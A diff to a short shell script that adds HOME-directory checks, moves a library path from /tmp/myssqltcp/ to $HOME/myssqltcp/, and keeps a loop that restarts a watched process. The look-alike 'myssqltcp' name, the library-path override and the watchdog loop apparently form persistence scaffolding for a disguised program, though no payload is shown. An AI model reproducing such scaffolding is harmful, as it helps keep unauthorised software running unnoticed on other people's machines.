@@ -1,7 +1,18 @@
 #!/bin/sh
+#!/bin/bash
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
 
 #添加本地执行路径
-export LD_LIBRARY_PATH=/tmp/myssqltcp/
+export LD_LIBRARY_PATH=$HOME/myssqltcp/
 
 while true; do
         #启动一个循环，定时检查进程是否存在
